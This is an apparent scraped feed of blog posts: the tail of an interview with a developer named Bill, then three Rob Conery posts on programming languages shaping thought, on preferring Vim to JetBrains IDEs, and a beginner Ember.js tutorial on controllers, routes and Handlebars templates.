what you know now would you have started programming?</b><br /><br />Well I'm not really programming at all these days, so I guess if I knew then what I know now then I'd be doing Enterprise Architecture.  Although it would be hard to get businesses to take me seriously in that capacity as a 16 year old.  If I knew I would eventually end up doing Enterprise Architecture, then yes I would indeed have started programming as it eventually got me to where I wanted to be.<br /><br /><b>What’s the most fun you’ve ever had... programming?</b><br /><br />Hard to say.  There's always been good times and bad.  I can't say that I've ever found commercial programming<i>fun</i>exactly.  I've always found it rewarding and enjoyable.  I would say that the demo programs I wrote many years ago were fun to write.  I wasn't being paid for it, so they must have been. :-)<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/-RByDg-Aib4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1266}}

Words are language, code is language. Restricting yourself to one or two languages is limiting your cognitive abilities</p><p><img src='http://wekeroad.com/images/language_map.png'/></p><p><p><em>image from<a href=\"http://visual.ly/network-graph-programming-languages-influence\">http://visual.ly/network-graph-programming-languages-influence</a></em></p><h2>Words as a Conceptual Map</h2><p>There's a small bit of setup here - bear with me.<a href=\"http://www.radiolab.org/2010/aug/09/\">I relistened to one of my favorite RadioLab podcasts ('Words')</a>this weekend and had my mind blown, once again. They dug into<strong>what words mean</strong>to us and, according to the show, words are much more than expression vehicles.</p><p><strong>Words are the very structure of our higher reasoning</strong>.</p><p>In other words:<em>if you can't say it, you can't think it.</em>The words themselves are cognitive variables strung together to represent feeling, emotion, memory - abstract things made concrete by the words we put to them.</p><p>High-minded stuff and rather than regurgitate the whole show here - go listen if you haven't, it's very good. It left me quite inspired and I wondered if the the ideas in the show could extend to programming languages. Why not? Code is simply syntax laid on top of process that a machine needs to understand... hmmm....</p><p>We tell machines how to think - which directly reflects how we think. Writing code always seemed like such a\"machine-y\" thing to do, but I think that's not the case:<strong>Programming languages are true languages</strong>written for us to describe problems that a machine can understand.</p><p>These languages are stripped of nuance and imbued with functionality (loops, terse conditionals) for a myriad of problems.<em>How well do you speak code?</em></p><h2>A Thought Experiment</h2><p>Code is language, and how we solve problems with a given programming language directly relates to<strong>how we think in that language</strong>. This doesn't seem like an amazing revelation in and of itself - in fact I think you probably already understood this quite well.</p><p>But what if we reversed it? What if you couldn't think any other way - other than what that language<em>allowed you to think</em>. What if your coding language of choice<strong>was the abstraction over your programming thought process</strong>- that you actually lacked the mental faculties that lie outside of what that language can represent?</p><p>Let's say you walk into an interview and you get hit with a classic interview question (no, not FizzBuzz):<strong>write a routine that spits out Fibonacci numbers</strong>. It's something every dev has had to do at some point.</p><p>Now, slow your brain down and rewind. What language are you using to express this? What is that language<strong>allowing you to do</strong>.</p><p>If the only programming language you know is C# you're probably writing some LINQ in your mind and running a modulus. If you use Javascript you're probably doing something similar but maybe spread over two functions utilizing callbacks.</p><p>Rubyists out there might do something similar - favoring a more idiomatic approach with blocks/yield rather than a terse one-liner.</p><p><strong>Now write it using a Monad</strong>.</p><p><strong>Recursion?</strong></p><p>I'm sure a few of my readers could do all the above (LINQ, callbacks/blocks, Monad and Recursion) but I doubt that most of you can. This is due to the languages you know, the idioms they use, and<strong>the way those languages allow you to think about a problem</strong>.</p><h2>Expanding Your Thought Process</h2><p>I don't know anything about monads but I've done recursive programming in the past (sometimes not-intentionally). When I started using Ruby, I began to value the idiom of passing control back and forth using blocks and yield. You can do this in many languages - but for some reason it wasn't something I routinely did in C#.</p><p>The asynchronous nature of Javascript has awakened a part of my mind to evented programming. Again you can do this in many languages but it's idiomatic in Javascript and Node.</p><p>I can\"think\" in these terms and solve problems in ways I could never do when I knew only one language well (C#). At the time I liked the idea of\"going deep\" - of knowing a language so thoroughly that I could solve any problem with it and not clutter my mind with the different syntaxes of other languages.</p><p>I'm glad I didn't. And listening to that Radiolab podcast this last weekend made me understand why. I used to think it was that learning new languages would help me\"think differently\" but now I know it's more than that:<strong>I'm smarter now</strong>.</p><p>I'm not an egotistical guy and it hurts a bit to write that last paragraph - as if I'm suggesting that I'm smarter than people who know only one programming language -<strong>which is clearly not true</strong>. My point is only that<em>I'm smarter than I was 4 years ago</em>and the reason I think that is because I can solve problems in more ways than I could before and if my definition of\"intellect\" is accurate...</p><p><img src=\"/images/intellect.png\" alt=\"Definition of'Intellect'\"></p><p>... then yeah: I think it's OK to say I'm smarter than I was with respect to programming.</p><p>The thing I enjoy most about all of this is that I would never have thought about this until I heard that Radiolab podcast. They put the words to the very idea that words are our higher reasoning.</p><p>A lovely bit of recursive fun.</p><p><strong>Would I have recognized that recursion a few years ago? Hmmmm....</strong></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PIz2b8ykqmw\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1267}}

Code, email, docs - whatever. One of the biggestefficiency gains you can achieve is to<strong>become a faster editor</strong>. This is what Vim does best: help you edit Faster, Better, Stronger - and you can carry these skills with you to almost any editor available today.</p><p>Notice I didn't say that Vim makes you a\"faster typer\" - no a faster Editor. Modern IDEs have focused on that of late - and no one is better at it than JetBrains.</p><p>For the last 4 months I've been using<a href=\"http://www.jetbrains.com/ruby/\">RubyMine</a>and<a href=\"http://www.jetbrains.com/webstorm\">WebStorm</a>and have fallen in love with them. WebStorm especially - if you're a Javascript person (Node or whatever) - it's a great deal at $49.</p><p><img src=\"http://www.jetbrains.com/webstorm/whatsnew/screenshots/60/html5outline.png\" alt=\"WebStorm\"></p><p>I'm not an intellisense person (since moving my focus away from .NET) but I do find it extremely helpful when working with new libraries. For instance: the Angular plugin for WebStorm helped me explore many of the\"ng-\" tags that I would not have seen otherwise.</p><p><img src=\"/images/angular-plugin.png\" alt=\"Angular Plugin\"></p><p>In the<a href=\"http://tekpub.com/productions/angular\">Tekpub Angular Series</a>I've been using WebStorm exlclusively and I've really enjoyed it.</p><p>Both RubyMine and WebStorms have interesting navigation schemes (I think this extends to Resharper for VS too):</p><ul><li>Cmd-O allows you to search by a class name</li><li>Cmd-Shift-O allows you to search by file name</li><li>Cmd-Option-O allows you to search by symbol (a method name, for instance)</li><li>Cmd-B takes you to a class or method declaration directly</li><li>In the gutter of a Rails project are\"go to view\" (when you're in a Controller) and\"go to Controller\" when you're in a view</li><li>Cmd-E opens a popup of recently edited files</li></ul><p>Really helpful stuff. In addition there are some great inspection features that offer\"squigglies\" (as Hanselman calls them) when methods aren't found, script files don't exist, etc. If you trust it - the editor will also give you refactoring options for your code...</p><p>These are helpful features - but are they helping me edit code faster? In some ways yes... in other ways...</p><h2>Enter Vim</h2><p><a href=\"http://codeofrob.com\">Rob Ashton</a>was out here in Hawaii visiting recently and he is a devoted Vim user. I was showing him WebStorm and all the neat things that go with it - but both of us agreed that we could code faster in Vim.</p><p><i><strong>Note</strong>: I know there are Vim plugins for JetBrains bits (and most other IDEs) - I'll get there.</i></p><p>While recording a video<a href=\"http://us2.campaign-archive1.com/?u=5e6e923ae72e1d1815a5df825&id=40b9d577bd&e=\">for our upcoming\"Career Reboot\" production at Tekpub</a>, I asked Rob\"what tools do you take with you while you hop the globe, journeyman coding\"?</p><p><img src=\"/images/reboot.jpg\" alt=\"Tekpub's Career Reboot\"></p><p>For the last year or so<strong>Rob has been travelling the planet</strong>, working on various projects for a few weeks at a time. His experiment was a simple one:</p><blockquote><p>Pay for my travel, lodging and food and I'll do the work for free</p></blockquote><p>With him was<strong>a single bag for his clothes and a backpack with 2 computers</strong>. He gave up his house and all of his furniture and put a few small things in storage and then set out - ending his journey here in Hawaii.</p><p>His work was varied and he wasn't sure for than a month at a time where he'd be next. Aside from the practical aspect - how do you prepare your machine for working in projects ranging from .NET to C++, Ruby to JavaScript. Rob hate's VMs as well - preferring to work on the native OS.</p><p><strong>He has one Windows Machine and one Mac</strong>. He wiped OSX off his Mac, however, and installed Ubuntu...</p><p>So what does Rob rely on for writing code?</p><blockquote><p>Vim</p></blockquote><p>For much of the code he writes, Vim will suffice, everytime. He can load up any set of plugins he needs to write effectively in Ruby, Javascript or Python. He knows the commands well and to watch him use the editor is a fascinating treat.</p><p>When working in Visual Studio, he uses<a href=\"http://visualstudiogallery.msdn.microsoft.com/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329\">the VsVim plugin</a>and, according to him:</p><blockquote><p>If I didn't have these Vim plugins for VisualStudio I'd be screwed</p></blockquote><p>Most IDEs have a Vim\"overlay\". All of the JetBrains IDEs do, and so does SublimeText and ... well just about any editor you can think of.</p><h2>Vim, Everywhere</h2><p><strong>In terms of editing code, Vim won.</strong>The eternal Vim/Emacs war will rage on forever - but I don't think anyone can argue that,<strong>in terms of pure editing power: Vim does what it does, extremely well</strong>.</p><p>From your new shiny Mac Air to the Linux box in the cloud somewhere: open the terminal and hit\"vim\" and it's likely there, ready to edit config files or code.<strong>Vim is the Alpha and Omega editor</strong>- the beginning and the end.<strong>Vim is everywhere</strong>.</p><p><em>So it's back to Vim for me</em>. I like the JetBrains tools and I enjoy SublimeText 2 a lot... but I can move and edit in Vim at twice the speed.</p><p>You might be wondering:<strong>\"why not just use a Vim plugin dude?\"</strong></p><p>The inspections, plugins and\"helper\" functions in the JetBrains tools are interesting and helpful,<strong>but they come at a price</strong>(to me). It slows down the IDE, slows down typing, and many times it offers things I just don't want (like spelling corrections in my HTML files).</p><p>Often-times I feel like I spent an increasing amount of time diddling with the IDE more than the code. Looking up shortcuts, setting up configurations for testing, running and debugging... when I know how to do this already<strong>without the slick interface</strong>.</p><p>I like a pretty coding surface. I appreciate clean font rendering and seeing a project tree with all my code files and a fast, fuzzy file-finding feature.<em>And I can get all of that with Vim</em>.</p><p>I proved that to myself yesterday when editing a Rails project. Leader-P brought up<a href=\"https://peepcode.com/products/peepopen\">PeepOpen</a>,<code>\"/mailto\"</code>took me to a broken mail link.<code>\"c4w mailto:support\"</code>and the broken email was fixed.<code>RController pro[tab]</code>and I'm editing the ProductsController...</p><p>My Vim-glee was broken, however, when I realized I had forgotten the syntax for ActiveRecords eager-loading feature (include, include?, includes). Uh oh.</p><p>Rob put it very well when discussing IDEs:</p><blockquote><p>If a tool starts thinking for me, starts remembering the syntax that I need to write... I'll forget the code and start becoming reliant on that tool to do my work for me.</p></blockquote><p>This has happened to me ... quite often. When I was working in .NET it was nearly impossible for me to free-hand (without intellisense) simple structures like lambdas or a generic class definition using an interface. It's a syntax-heavy language and I can see how intellisense helps you with it.</p><p>The thing you lose, however, is<em>thinking in that language</em>. When the syntax is ready in your brain, you can<strong>think in code</strong>and sidestep the translation through the editor.</p><p>This is where Vim shines most and languages like Ruby flex their expressive muscle.<strong>You think the code, Vim expresses it directly</strong>.</p><p>The best part? You don't need to be using Vim to use Vim. Drop a plugin in a JetBrains IDE or Visual Studio and you're off (if you need to use those tools for whatever reason).</p><p>You never know, one day you might need to work in Clojure in Vilnius...</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/S7Y_jH8HtTE\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1268}}

If you're on Windows, just hit F5.</p><p>Now let's write some Ember code.</p><h2>Step 1: The Application View</h2><p>Up front: there's a lot of magic that happens behind the scenes with Ember. Just about any tutorial you read will spend 75% of the time explaining the concepts behind Ember, and 25% of the time on actually using it.</p><p>This can be daunting for people who\"want to get a feel\" (like me) and don't like sitting through conceptual lectures. I like to write code to understand a tool - so let's do that and I'll explain what I know along the way.</p><p>Open up js/app.js and create the Ember application:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span></code></pre></td></tr></table></div></figure><p>We have an application, which is a lovely start. We need at least two more things before we know that Ember is even alive and running:</p><ul><li>a View</li><li>a Controller</li></ul><p>The simplest view to create is the overall application view - let's add that to our HTML page, removing the first-level headers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>This script tag is a Handlebars template. If you don't know what that is: it's just like an ERB template in Rails (or a Razor template in ASP.NET MVC) except it works with Javascript on the client.</p><p>Handlebars is pretty simple to use, and Ember extends some of its functionality to make it work happily with the Ember bits.</p><p>We've identified this template using<code>data-template-name</code>as being the main application viewport. Let's stick something in it.</p><h2>Step 2: The Application Controller</h2><p>If you're familiar with Rails-style MVC, well... forget it. There are many flavors of MVC and we'll be working with Desktop/Smalltalk-80 style here. This confused me greatly, and I still don't know how I feel about it, but it doesn't matter. This is the way Ember works.</p><p>In short:<strong>Controllers in Ember convey data to your templates</strong>.</p><p>To see this let's create our first Controller. Open up app.js:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">ApplicationController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>If you've used Backbone before, this will look very odd. I should also mention that using the ApplicationController like this is not a good idea - I'll fix it in just a second.</p><p>Let's update the view so we can see our data:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>If you're working in Chrome, make sure the console is open by using Cmd-Shift-I (or Ctrl-Shift-I in Windows). If you see any errors here, correct them. It's likely you might have a 404 reference to one of your script files, or you've put them in your page in the wrong order (use my code above for the right order).</p><p>If everything is working: refresh your page - you should see a nice, Wonka greeting.</p><h2>Step 3: Conventions</h2><p>Look back over what we've written. Nowhere did we state\"get this template and render it this way\". Instead, Ember used the name of our template and married it up with the name of our Controller - and it all<em>just worked</em>.</p><p>This is a key bit of understanding with Ember:<strong>Naming things properly is everything</strong>.</p><p>To see this, let's get out of working with our ApplicationController directly.</p><p>First, create a new Controller, we'll call it the\"IndexController\". Don't name it something else - IndexController is what shows by default:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Now, let's update our view so that the application view doesn't have hard-coded values in it:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">outlet</span><span class=\"p\">}}</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"index\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>Refresh your page. You should see the same thing we saw before: a nice Wonka greeting. But what happened here?</p><p>Again: naming conventions at work. The ApplicationController is gone from our code, but it still exists\"behind the scenes\" as Ember created it for us. In the first example (where we worked directly with it) - you can think of that as\"overriding\" the ApplicationController.</p><p>The same goes with the IndexController. It was always there - but we didn't need it. In the second example we essentially\"overrode\" the IndexController and created a view for it.</p><p>The rendered view was then injected into the application view where<code>{{outlet}}</code>sits on the page. You can think of<code>{{outlet}}</code>in the same way that<code>yield</code>is used in Rails.</p><h2>Step 4: Models and Routing</h2><p>We've done some basic stuff here, let's explore the other parts of Ember. Once again, I'll keep it<strong>extremely simple</strong>.</p><p>In app.js, let's define a model. I'll do this by extending an Ember Object:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p><strong>Update</strong>- this code has been changed based on feedback from Tom Dale and comments below.</p><p>Now, let's define a Route. Routes in Ember help to link models to Controllers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//our app</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">({});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our model</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our route</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is all the code you should have in app.js. Notice how we have no Controller? We don't need one. This is confusing, but let's make sure things are working - refresh your page and you should see everything working just fine.</p><p>Assuming that it is - what we have here is naming magic at work, again. We've always had an IndexRoute (Ember created it for us since we didn't explicitly declare one) - but this time we wanted to specify a model so we needed to use a Route.</p><p>I mentioned that the Route exists to marry up a Controller to a Model,<strong>but we have no Controller!</strong>This can be maddening: we<em>do have a Controller</em>, we just didn't have to write the code for it: Ember did that for us.</p><p>The Controller that Ember created (the IndexController) was associated to our Route because we kept with the Ember naming magic. That Controller took the model that was available on the Route and\"grafted it\" onto itself, making the data on the model available to our view.</p><h2>Good Job!</h2><p>If you've made it this far, you now know as much as I do. There's a lot happening in the background with Ember; the goal being that the Ember team wants to reduce the tedious\"boilerplate\" code you write with other frameworks, like Backbone.</p><p>This can be a neat thing, it can also be highly confusing if you don't know what's going on.</p><p>I encourage you to play around with Ember and Handlebars now that you have your footing. It's an interesting thought experiment that works well for many developers.</p><p><strong>Note:</strong><em>I'm not an Ember expert by any stretch so if you've found any misstatements or silliness here, please do let me know and I'll adjust.</em></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yMrhlO3kWpI:JEq8vZS8rjk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yMrhlO3kWpI:JEq8vZS8rjk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/yMrhlO3kWpI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1269}}

